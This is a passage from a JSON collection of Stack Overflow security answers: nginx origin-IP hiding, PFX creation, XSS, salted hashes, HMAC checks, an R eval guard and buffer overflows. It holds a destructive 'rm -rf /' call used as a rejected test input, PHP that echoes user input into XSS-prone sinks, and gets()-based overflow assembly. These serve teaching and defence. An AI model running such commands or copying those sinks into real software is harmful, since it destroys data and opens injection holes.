        "body": "C#\nprivate static byte[] MergePFXFromPrivateAndCertificate(RSAParameters privateKey, X509Certificate2 certificate, string pfxPassPhrase)\n{\n\tRsaPrivateCrtKeyParameters rsaParam = new RsaPrivateCrtKeyParameters(\n\t\tParseAsUnsignedBigInteger(privateKey.Modulus),\n\t\tParseAsUnsignedBigInteger(privateKey.Exponent),\n\t\tParseAsUnsignedBigInteger(privateKey.D),\n\t\tParseAsUnsignedBigInteger(privateKey.P),\n\t\tParseAsUnsignedBigInteger(privateKey.Q),\n\t\tParseAsUnsignedBigInteger(privateKey.DP),\n\t\tParseAsUnsignedBigInteger(privateKey.DQ),\n\t\tParseAsUnsignedBigInteger(privateKey.InverseQ)\n\t);\n\tOrg.BouncyCastle.X509.X509Certificate bcCert = new Org.BouncyCastle.X509.X509CertificateParser().ReadCertificate(certificate.RawData);\n\tMemoryStream p12Stream = new MemoryStream();\n\tPkcs12Store p12 = new Pkcs12Store();\n\tp12.SetKeyEntry(\"key\", new AsymmetricKeyEntry(rsaParam), new X509CertificateEntry[] { new X509CertificateEntry(bcCert) });\n\tp12.Save(p12Stream, pfxPassPhrase.ToCharArray(), new SecureRandom());\n\treturn p12Stream.ToArray();\n}\nprivate static BigInteger ParseAsUnsignedBigInteger(byte[] rawUnsignedNumber)\n{\n\treturn new BigInteger(1, rawUnsignedNumber, 0, rawUnsignedNumber.Length);\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-04-23T08:18:23",
        "author": "Froggy"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63946323/symfony-5-how-to-check-if-user-is-banned-or-not-before-login",
    "title": "Symfony 5 : how to check if user is banned or not before login",
    "question_id": 63946323,
    "posted_date": "2020-09-17T17:19:49",
    "answers": [
      {
        "answer_id": 63948585,
        "body": "namespace App\\Security;\nuse Symfony\\Component\\Security\\Core\\Exception\\CustomUserMessageAuthenticationException;\nuse Symfony\\Component\\Security\\Core\\User\\UserCheckerInterface;\nuse Symfony\\Component\\Security\\Core\\User\\UserInterface;\nclass UserChecker implements UserCheckerInterface\n{\n    public function checkPreAuth(UserInterface $user)\n    {\n        if ($user->getIsBanned()) {\n            throw new CustomUserMessageAuthenticationException(\"You're banned !\");\n        }\n    }\n    public function checkPostAuth(UserInterface $user)\n    {\n    }\n}",
        "score": 13,
        "is_accepted": true,
        "creation_date": "2020-09-17T22:39:55",
        "author": "Victor Weiss"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64225024/how-to-prevent-origin-server-ip-address-behind-cdn-from-exposed-like-cloudflare",
    "title": "How to prevent origin server IP address behind CDN from exposed, like Cloudflare?",
    "question_id": 64225024,
    "posted_date": "2020-10-06T07:37:27",
    "answers": [
      {
        "answer_id": 64225025,
        "body": "http {\n    # control options\n    strict_sni on;\n    strict_sni_header on;\n    # fake server block\n    server {\n        server_name  localhost;\n        listen       80;\n        listen       443 ssl default_server; # \"default_server\" is necessary\n        ssl_certificate /root/cert.crt; # Can be any certificate here\n        ssl_certificate_key /root/cert.key; # Can be any certificate here\n        location / {\n            return 444;\n        }\n    }\n    # normal server blocks\n    server {\n        server_name  normal_domain.tld;\n        listen       80;\n        listen       443 ssl;\n        ssl_certificate /root/cert.crt; # Your real certificate here\n        ssl_certificate_key /root/cert/cert.key; # Your real certificate here\n        location / {\n            echo \"Hello World!\";\n        }\n    }\n}",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "curl -v -k https://35.186.1.1\n* Rebuilt URL to: https://35.186.1.1/\n*   Trying 35.186.1.1...\n* TCP_NODELAY set\n* Connected to 35.186.1.1 (35.186.1.1) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n  CApath: /etc/ssl/certs\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\n* TLSv1.2 (OUT), TLS change cipher, Client hello (1):\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\n* TLSv1.2 (IN), TLS handshake, Finished (20):\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\n* ALPN, server accepted to use http/1.1\n* Server certificate:\n*  subject: CN=normal_domain.tld\n*  start date: Nov 15 05:41:39 2019 GMT\n*  expire date: Nov 14 05:41:39 2020 GMT\n*  issuer: CN=normal_domain.tld\n> GET / HTTP/1.1\n> Host: 35.186.1.1\n> User-Agent: curl/7.58.0\n> Accept: */*\n* Empty reply from server\n* Connection #0 to host 35.186.1.1 left intact\ncurl: (52) Empty reply from server",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "curl -v -k https://35.186.1.1\n* Rebuilt URL to: https://35.186.1.1/\n*   Trying 35.186.1.1...\n* TCP_NODELAY set\n* Connected to 35.186.1.1 (35.186.1.1) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS alert, Server hello (2):\n* error:14094458:SSL routines:ssl3_read_bytes:tlsv1 unrecognized name\n* stopped the pause stream!\n* Closing connection 0\ncurl: (35) error:14094458:SSL routines:ssl3_read_bytes:tlsv1 unrecognized name",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "curl -v -k --resolve wrong_domain.tld:443:35.186.1.1 https://wrong_domain.tld\n* Added wrong_domain.tld:443:35.186.1.1 to DNS cache\n* Rebuilt URL to: https://wrong_domain.tld/\n* Hostname wrong_domain.tld was found in DNS cache\n*   Trying 35.186.1.1...\n* TCP_NODELAY set\n* Connected to wrong_domain.tld (35.186.1.1) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS alert, Server hello (2):\n* error:14094458:SSL routines:ssl3_read_bytes:tlsv1 unrecognized name\n* stopped the pause stream!\n* Closing connection 0\ncurl: (35) error:14094458:SSL routines:ssl3_read_bytes:tlsv1 unrecognized name",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "curl -v -k --resolve normal_domain.tld:443:35.186.1.1 https://normal_domain.tld\n* Added normal_domain.tld:443:35.186.1.1 to DNS cache\n* Rebuilt URL to: https://normal_domain.tld/\n* Hostname normal_domain.tld was found in DNS cache\n*   Trying 35.186.1.1...\n* TCP_NODELAY set\n* Connected to normal_domain.tld (35.186.1.1) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\n* ALPN, server accepted to use http/1.1\n* Server certificate:\n*  subject: CN=normal_domain.tld\n*  start date: Nov 15 05:41:39 2019 GMT\n*  expire date: Nov 14 05:41:39 2020 GMT\n*  issuer: CN=normal_domain.tld\n> GET / HTTP/1.1\n> Host: normal_domain.tld\n> User-Agent: curl/7.58.0\n> Accept: */*\n< HTTP/1.1 200 OK\n< Server: nginx/1.17.5\n< Date: Fri, 15 Nov 2019 05:53:19 GMT\n< Content-Type: text/plain\n< Connection: keep-alive\n* Connection #0 to host normal_domain.tld left intact",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "load_module \"modules/ngx_stream_module.so\";\nhttp{ # Design the http block by yourself\n    server {\n        listen 80 default_server;\n        server_name localhost;\n        location / {\n            proxy_pass http://104.27.184.146:80; # Feign as Cloudflare's CDN node\n            proxy_set_header Host $host;\n        }\n    }\n    server {\n        listen 80;\n        server_name yourwebsite.com; # If you set https as the only scheme for CDN nodes requesting your origin server, you should not configure the block of your real website in the http{} block, aka here (except that the listen address is \"localhost\" instead of the public network IP)\n        location / {\n            proxy_pass http://127.0.0.1:8080; # Your backend\n            proxy_set_header Host $host;\n        }\n    }\n}\nstream{\n    map $ssl_preread_server_name $name {\n        yourwebsite.com website-upstream; # Your real website's route\n        default cloudflare; # Default route\n    }\n    upstream cloudflare {\n        server 104.27.184.146:443; # Cloudflare IP\n    }\n    upstream website-upstream {server 127.0.0.1:8080;} # Your real website's backend\n    server {\n        listen 443;\n        proxy_pass $name;\n        proxy_ssl_name $ssl_preread_server_name;\n        proxy_ssl_protocols TLSv1.2 TLSv1.3;\n        ssl_preread on;\n    }\n}",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "curl -I -v --resolve www.cloudflare.com:443:127.0.0.1 https://www.cloudflare.com/\n* Expire in 0 ms for 6 (transfer 0x55f3f0ae0f50)\n* Added www.cloudflare.com:443:127.0.0.1 to DNS cache\n* Hostname www.cloudflare.com was found in DNS cache\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Expire in 200 ms for 4 (transfer 0x55f3f0ae0f50)\n* Connected to www.cloudflare.com (127.0.0.1) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384\n* ALPN, server accepted to use h2\n* Server certificate:\n*  subject: businessCategory=Private Organization; jurisdictionC=US; jurisdictionST=Delaware; serialNumber=4710875; C=US; ST=California; L=San Francisco; O=Cloudflare, Inc.; CN=cloudflare.com\n*  start date: Oct 30 00:00:00 2018 GMT\n*  expire date: Nov  3 12:00:00 2020 GMT\n*  subjectAltName: host \"www.cloudflare.com\" matched cert's \"www.cloudflare.com\"\n*  issuer: C=US; O=DigiCert Inc; OU=www.digicert.com; CN=DigiCert ECC Extended Validation Server CA\n*  SSL certificate verify ok.\n* Using HTTP2, server supports multi-use\n* Connection state changed (HTTP/2 confirmed)\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\n* Using Stream ID: 1 (easy handle 0x55f3f0ae0f50)\n> HEAD / HTTP/2\n> Host: www.cloudflare.com\n> User-Agent: curl/7.64.0\n> Accept: */*\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n* Connection state changed (MAX_CONCURRENT_STREAMS == 256)!\n< HTTP/2 200\nHTTP/2 200\n< date: Tue, 06 Oct 2020 06:26:50 GMT\n* Connection #0 to host www.cloudflare.com left intact",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      },
      {
        "answer_id": 64225025,
        "body": "cat > csrconfig.txt <<-EOF\n[ req ]\ndefault_md=sha256\nprompt=no\nreq_extensions=req_ext\ndistinguished_name=req_distinguished_name\n[ req_distinguished_name ]\ncommonName=yeet.com\ncountryName=SG\n[ req_ext ]\nkeyUsage=critical,digitalSignature,keyEncipherment\nextendedKeyUsage=critical,serverAuth,clientAuth\nsubjectAltName=@alt_names\n[ alt_names ]\nDNS.0=yeet.com\nEOF\ncat > certconfig.txt <<-EOF\n[ req ]\ndefault_md=sha256\nprompt=no\nreq_extensions=req_ext\ndistinguished_name=req_distinguished_name\n[ req_distinguished_name ]\ncommonName=yeet.com\ncountryName=SG\n[ req_ext ]\nsubjectKeyIdentifier=hash\nauthorityKeyIdentifier=keyid:always,issuer\nkeyUsage=critical,digitalSignature,keyEncipherment\nextendedKeyUsage=critical,serverAuth,clientAuth\nsubjectAltName=@alt_names\n[ alt_names ]\nDNS.0=yeet.com\nEOF\nopenssl genpkey -outform PEM -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out cert.key\nopenssl req -new -nodes -key cert.key -config csrconfig.txt -out cert.csr\nopenssl req -x509 -nodes -in cert.csr -days 365 -key cert.key -config certconfig.txt -extensions req_ext -out cert.pem",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2020-10-06T07:37:27",
        "author": "icebox"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72080895/xss-attack-still-works-despite-htmlspecialchars-doing-its-work",
    "title": "XSS attack still works despite htmlspecialchars() doing its work",
    "question_id": 72080895,
    "posted_date": "2022-05-01T18:39:09",
    "answers": [
      {
        "answer_id": 72185344,
        "body": "<?php\n $user_entered_variable = htmlspecialchars($user_entered_variable);\n $isValidURL = filter_var($user_entered_variable, FILTER_VALIDATE_URL) !== false;\n if(!$isValidURL)\n    $user_entered_variable = 'invalid://invalid';\n?>\n    <iframe src=\"<?php echo $user_entered_variable; ?>\"></iframe>\n    <img src=\"<?php echo $user_entered_variable; ?>\">\n    <a href=\"<?php echo $user_entered_variable; ?>\">Link</a>\n    <script>function openLink(link){window.open(link);}</script>\n    <button onclick=\"openLink('<?php echo $user_entered_variable; ?>')\">JavaScript Window XSS</button>",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2022-05-10T07:13:14",
        "author": "Pouya Darabi"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61893312/how-to-check-password-in-database-if-password-was-encrypted-with-salt",
    "title": "How to check password in database if password was encrypted with &quot;salt&quot;?",
    "question_id": 61893312,
    "posted_date": "2020-05-19T10:17:03",
    "answers": [
      {
        "answer_id": 61906157,
        "body": "| username | salt             | plain-password |salted-password-to-be-hashed | hashed-password                                                  |\n|----------|------------------|----------------|------------------------------|------------------------------------------------------------------|\n| user1    | db97913154884d72 | password1      | password1db97913154884d72     | 5027a576d161385ddcc72e47280f85729fc3ba5e48e0a018e2f68dc7d13e93cc |\n| user2    | 8fc2884d127fd40b | password1      | password18fc2884d127fd40b    | 6069e0e5a06d41ed0ffb06d0c0e26dd7dea3cb14de80e4075848d3217b40b783 |",
        "score": 5,
        "is_accepted": true,
        "creation_date": "2020-05-20T02:04:19",
        "author": "denizkanmaz"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/732107/manually-validate-server-certificate-in-wininet",
    "title": "Manually validate server certificate in WinINet",
    "question_id": 732107,
    "posted_date": "2009-04-08T18:19:34",
    "answers": [
      {
        "answer_id": 39126367,
        "body": "PCCERT_CHAIN_CONTEXT CertCtx=NULL;\nDWORD cbCertSize = sizeof(&CertCtx);\n// Get certificate chain information\nif (InternetQueryOption(hRequest, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, (LPVOID)&CertCtx, &cbCertSize))\n{\n    PCCERT_CHAIN_CONTEXT pChainContext=CertCtx;\n    CERT_SIMPLE_CHAIN *simpleCertificateChainWithinContext = NULL;\n    for (int i=0; i<pChainContext->cChain; i++)\n    {\n        simpleCertificateChainWithinContext=pChainContext->rgpChain[i];\n\n        // We can check any certificates from chain, but if selfsigned it will be single\n        for (int simpleCertChainIndex = 0; simpleCertChainIndex < simpleCertificateChainWithinContext->cElement; simpleCertChainIndex++)\n        {\n            // get the CertContext from the array\n            PCCERT_CONTEXT pCertContext = simpleCertificateChainWithinContext->rgpElement[simpleCertChainIndex]->pCertContext;\n\n            // Public key can be getted from\n            //  (((*((*pCertContext).pCertInfo)).SubjectPublicKeyInfo).PublicKey).pbData\n            // but better to use thumbprint to check\n            // CERT_HASH_PROP_ID - is a thumbprint\n            BYTE thumbprint[1024];\n            DWORD len = 1024;\n            if (CertGetCertificateContextProperty(pCertContext, CERT_HASH_PROP_ID, thumbprint, &len)) {\n                //\n                // !!! HERE WE CAN CHECK THUMPRINT WITH TRUSTED(PREVIOUSLY SAVED)\n                // and return error, or accept request output.\n                //\n            }\n        }\n    }\n\n    // important! Free the CertCtx\n    CertFreeCertificateChain(CertCtx);\n}",
        "score": 5,
        "is_accepted": false,
        "creation_date": "2016-08-24T10:39:23",
        "author": "m_skipper"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74482350/adding-length-limit-when-deserializing-a-string-a-vec-or-an-array",
    "title": "Adding length limit when deserializing a String, a Vec or an Array",
    "question_id": 74482350,
    "posted_date": "2022-11-17T16:33:14",
    "answers": [
      {
        "answer_id": 74483246,
        "body": "use std::ops::Deref;\nuse serde::de;\nuse serde::Deserialize;\nstruct LimitedString<const MAX_LENGTH: usize>(String);\nimpl<const MAX_LENGTH: usize> Deref for LimitedString<MAX_LENGTH> {\n    type Target = String;\n    fn deref(&self) -> &Self::Target {\n        &self.0\n    }\n}\nimpl<'de, const MAX_LENGTH: usize> de::Deserialize<'de> for LimitedString<MAX_LENGTH> {\n    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>\n    where\n        D: de::Deserializer<'de>,\n    {\n        <String as de::Deserialize>::deserialize(deserializer).and_then(|inner| {\n            if inner.len() > MAX_LENGTH {\n                Err(de::Error::invalid_length(inner.len(), &\"an integer lower than the maximum\"))\n            } else {\n                Ok(Self(inner))\n            }\n        })\n    }\n}\n#[derive(Deserialize)]\npub struct Foo {\n    bar: LimitedString<4096>,\n}",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2022-11-17T18:19:45",
        "author": "PitaJ"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76810173/swiftui-how-to-save-url-bookmarks-with-security-scope",
    "title": "SwiftUI: How to save URL-Bookmarks with security scope",
    "question_id": 76810173,
    "posted_date": "2023-08-01T05:13:35",
    "answers": [
      {
        "answer_id": 77718986,
        "body": ".fileImporter(isPresented: $isPresenting, allowedContentTypes: [.image, .pdf], allowsMultipleSelection: true) { result in\n  switch result {\n    case .success(let urls):\n      let items = urls.compactMap { url -> URLBookmark? in\n        let data: Data\n        let options: URL.BookmarkCreationOptions = [.withSecurityScope, .securityScopeAllowOnlyReadAccess, .withoutImplicitSecurityScope]\n\n        do {\n          let accessing = url.startAccessingSecurityScopedResource()\n\n          defer {\n            if accessing {\n              url.stopAccessingSecurityScopedResource()\n            }\n          }\n\n          data = try url.bookmarkData(options: options, includingResourceValuesForKeys: [])\n        } catch {\n          print(error)\n\n          return nil\n        }\n\n        return URLBookmark(url: url, bookmark: .init(data: data, options: options))\n      }\n\n      items.forEach { item in\n        let accessing = item.url.startAccessingSecurityScopedResource()\n\n        defer {\n          if accessing {\n            item.url.stopAccessingSecurityScopedResource()\n          }\n        }\n\n        // Do something...\n      }\n    case .failure(let err):\n      print(err)\n  }\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2023-12-26T15:23:33",
        "author": "Klay"
      },
      {
        "answer_id": 77718986,
        "body": "let bookmarks: [Bookmark] = ...\nlet items = bookmarks.compactMap { bookmark -> URLBookmark? in\n  var options = URL.BookmarkResolutionOptions()\n  if bookmark.options.contains(.withSecurityScope) {\n    options.insert(.withSecurityScope)\n  }\n  if bookmark.options.contains(.withoutImplicitSecurityScope) {\n    options.insert(.withoutImplicitStartAccessing)\n  }\n  var stale = false\n  let url: URL\n  do {\n    url = try URL(resolvingBookmarkData: bookmark.data, options: options, relativeTo: nil, bookmarkDataIsStale: &stale)\n  } catch {\n    print(error)\n    return nil\n  }\n  let data: Data\n  if stale {\n    do {\n      let accessing = url.startAccessingSecurityScopedResource()\n      defer {\n        if accessing {\n          url.stopAccessingSecurityScopedResource()\n        }\n      }\n      data = try url.bookmarkData(options: bookmark.options, includingResourceValuesForKeys: [])\n    } catch {\n      print(error)\n      return nil\n    }\n  } else {\n    data = bookmark.data\n  }\n  return .init(url: url, bookmark: .init(data: data, options: bookmark.options))\n}\n// Now do something with items...",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2023-12-26T15:23:33",
        "author": "Klay"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73721549/rsa-public-key-not-importing-into-c-asn1-corrupted-data-exception",
    "title": "RSA Public key not importing into C# - ASN1 corrupted data exception",
    "question_id": 73721549,
    "posted_date": "2022-09-14T14:21:01",
    "answers": [
      {
        "answer_id": 73722198,
        "body": "using System.Security.Cryptography;\n...\nstring pemX509 = @\"-----BEGIN PUBLIC KEY-----\n                MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5mPsHC34l7uz/Qlxma0s\n                fibiql2hcqbNVG/jyW6qAD9w+L9/ZBmaSo+wLMKI+xXVp5aHqDlgS07PxcWWLXFf\n                FLwdIk12rEXisbEPIj+3O+Fayqvk9NuUh9sDiVGOX7pMlnICFc+CdB3mK0sFRGkK\n                zOq3FJO19VxhzAI0dPQ6HDD4SLz/onuOoYMpcVfPa6bWDEe9MBCc1U+ypn9JNaq+\n                WrUjEw5RJbYCz451WPLa6wMKyIwA0EPck+h1yQc9+VCXwoK97awKE7wEPBwEG9HV\n                7UYMLJiVGvPkJypR+9+h/3M7CGVruhQwZG9Cz7QEqNm7oBQuyki5jyFAQueq8nKd\n                kwIDAQAB\n                -----END PUBLIC KEY-----\";\nRSA rsa = RSA.Create();\nrsa.ImportFromPem(pemX509);",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2022-09-14T15:24:16",
        "author": "Topaco"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71098045/what-is-boto3-inspector-v2-list-findings-nexttoken-initial-value",
    "title": "What is Boto3 Inspector v2 list_findings&#39; nextToken initial value?",
    "question_id": 71098045,
    "posted_date": "2022-02-13T00:01:38",
    "answers": [
      {
        "answer_id": 71098434,
        "body": "# Create a client\ninspector = boto3.client(\"inspector2\")\n# Create a reusable Paginator\npaginator = inspector.get_paginator('list_findings')\n# Create a PageIterator from the Paginator\npage_iterator = paginator.paginate(filterCriteria={\n                'findingStatus': [\n                    {\n                        'comparison': 'EQUALS',\n                        'value': 'ACTIVE'\n                    },\n                ],\n                'findingType': [\n                    {\n                        'comparison': 'EQUALS',\n                        'value': 'PACKAGE_VULNERABILITY'\n                    },\n                ],\n            })\nfor page in page_iterator:\n    print(page)",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2022-02-13T01:30:50",
        "author": "Marcin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60209531/how-to-consuming-the-wsdl-web-service-using-pkcs12-keystore-certificate",
    "title": "How to consuming the WSDL web service using Pkcs12 keystore certificate",
    "question_id": 60209531,
    "posted_date": "2020-02-13T08:56:42",
    "answers": [
      {
        "answer_id": 60692079,
        "body": "class MyEndpointBehavior : IEndpointBehavior\n{\n\tpublic void AddBindingParameters(ServiceEndpoint endpoint, BindingParameterCollection bindingParameters)\n\t{\n\t}\n\tpublic void ApplyClientBehavior(ServiceEndpoint endpoint, ClientRuntime clientRuntime)\n\t{\n\t\tclientRuntime.ClientMessageInspectors.Add(new MyMessageInspector());\n\t}\n\tpublic void ApplyDispatchBehavior(ServiceEndpoint endpoint, EndpointDispatcher endpointDispatcher)\n\t{\n\t}\n\tpublic void Validate(ServiceEndpoint endpoint)\n\t{\n\t}\n}\nclass MyMessageInspector : IClientMessageInspector\n{\n\tpublic void AfterReceiveReply(ref Message reply, object correlationState)\n\t{\n\t}\n\tpublic object BeforeSendRequest(ref Message request, IClientChannel channel)\n\t{\n\t\treturn null;\n\t}\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-03-15T06:49:07",
        "author": "weichch"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74411675/what-input-can-i-give-to-cause-a-buffer-overflow-that-results-in-exact-changes-i",
    "title": "What input can I give to cause a buffer overflow that results in exact changes in another variable?",
    "question_id": 74411675,
    "posted_date": "2022-11-12T04:11:27",
    "answers": [
      {
        "answer_id": 74412009,
        "body": ".LC0:\n        .string \"Here I want to enter a word with more letters than 20 to cause an overflow\"\n.LC1:\n        .string \"num: %d\"\nmain:\n        push    rbp\n        mov     rbp, rsp\n        sub     rsp, 32\n        mov     QWORD PTR [rbp-8], -200\n        mov     edi, OFFSET FLAT:.LC0\n        call    puts\n        lea     rax, [rbp-32]\n        mov     rdi, rax\n        call    gets\n        mov     rax, QWORD PTR [rbp-8]\n        mov     rsi, rax\n        mov     edi, OFFSET FLAT:.LC1\n        mov     eax, 0\n        call    printf\n        mov     eax, 0\n        leave\n        ret",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2022-11-12T05:11:04",
        "author": "chqrlie"
      },
      {
        "answer_id": 74412009,
        "body": "main:                                   # @main\n        push    rbp\n        mov     rbp, rsp\n        sub     rsp, 48\n        mov     dword ptr [rbp - 4], 0\n        mov     qword ptr [rbp - 40], -200\n        lea     rdi, [rip + .L.str]\n        call    puts@PLT\n        lea     rdi, [rbp - 32]\n        call    gets@PLT\n        mov     rsi, qword ptr [rbp - 40]\n        lea     rdi, [rip + .L.str.1]\n        mov     al, 0\n        call    printf@PLT\n        xor     eax, eax\n        add     rsp, 48\n        pop     rbp\n        ret\n.L.str:\n        .asciz  \"Here I want to enter a word with more letters than 20 to cause an overflow\"\n.L.str.1:\n        .asciz  \"num: %d\"",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2022-11-12T05:11:04",
        "author": "chqrlie"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74140005/limit-what-code-can-be-executed-when-evaluating-eval-user-input-for-patchwor",
    "title": "Limit what code can be executed when evaluating (eval()) user input for patchwork",
    "question_id": 74140005,
    "posted_date": "2022-10-20T08:36:57",
    "answers": [
      {
        "answer_id": 74140235,
        "body": "check_call <- function(inp_string, allowed_nms = LETTERS) {\n\n  allowed_fns <- c(\"+\", \"-\", \"/\", \"(\", \"|\", \"&\")\n\n  inp_call <- str2lang(inp_string)\n\n  all_nms <- all.vars(inp_call)\n  all_sym <- all.names(inp_call)\n  all_fns <- setdiff(all_sym, all_nms)\n\n  if (any(!all_fns %in% allowed_fns)) {\n    stop(\"This operation is not allowed\")\n  }\n\n  if (!is.null(allowed_nms) && any(!all_nms %in% allowed_nms)) {\n    stop(\"Not allowed object name.\")\n  }\n}\ncheck_call(\"(A | B) / C\")\ncheck_call(\"(A | B) / z\")\n#> Error in check_call(\"(A | B) / z\"): Not allowed object name.\ncheck_call(\"system('rm -rf /')\", allowed_nms = c(\"A\", \"B\"))\n#> Error in check_call(\"system('rm -rf /')\", allowed_nms = c(\"A\", \"B\")): This operation is not allowed",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2022-10-20T08:54:37",
        "author": "TimTeaFan"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72069351/what-is-double-hmac-verification-and-how-does-it-work",
    "title": "What is double HMAC verification and how does it work?",
    "question_id": 72069351,
    "posted_date": "2022-04-30T10:26:11",
    "answers": [
      {
        "answer_id": 72077067,
        "body": "public void validateHMACSHA256(byte[]receivedHMAC, byte[]message, byte[]key) {\n    HashAlgorithm hashAlgorithm = new HMACSHA256(key);\n    // size and algorithm choice are not secret; no weakness in failing fast here.\n    if (receivedHMAC.Length != hashAlgorithm.HashSize / 8) {\n        Throw new CryptographicException(\"HMAC verification failure.\");\n    }\n    byte[]calculatedHMAC = hashAlgorithm.ComputeHash(message);\n    // Now we HMAC both values again before comparing to randomize byte order.\n    // These two lines are all that is required to prevent many existing implementations\n    // vulnerable to adaptive chosen ciphertext attacks using the timing side channel.\n    receivedHMAC = hashAlgorithm.ComputeHash(receivedHMAC);\n    calculatedHMAC = hashAlgorithm.ComputeHash(calculatedHMAC);\n    for (int i = 0; i < calculatedHMAC.Length; i++) {\n        if (receivedHMAC[i] != calculatedHMAC[i]) {\n            throw new CryptographicException(\"HMAC verification failure.\");\n        }\n    }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2022-05-01T09:17:30",
        "author": "Robert"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70137612/aslr-and-memory-layout-on-64-bits-is-it-limited-to-the-canonical-part-128-tib",
    "title": "ASLR and memory layout on 64 bits: Is it limited to the canonical part (128 TiB)?",
    "question_id": 70137612,
    "posted_date": "2021-11-27T13:31:30",
    "answers": [
      {
        "answer_id": 70139356,
        "body": "========================================================================================================================\n    Start addr    |   Offset   |     End addr     |  Size   | VM area description\n========================================================================================================================\n                  |            |                  |         |\n 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm\n__________________|____________|__________________|_________|___________________________________________________________\n                  |            |                  |         |\n 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical\n                  |            |                  |         |     virtual memory addresses up to the -128 TB\n                  |            |                  |         |     starting offset of kernel mappings.\n__________________|____________|__________________|_________|___________________________________________________________\n                                                            |\n                                                            | Kernel-space virtual memory, shared between all processes:\n...",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-11-27T17:56:01",
        "author": "Peter Cordes"
      },
      {
        "answer_id": 70139356,
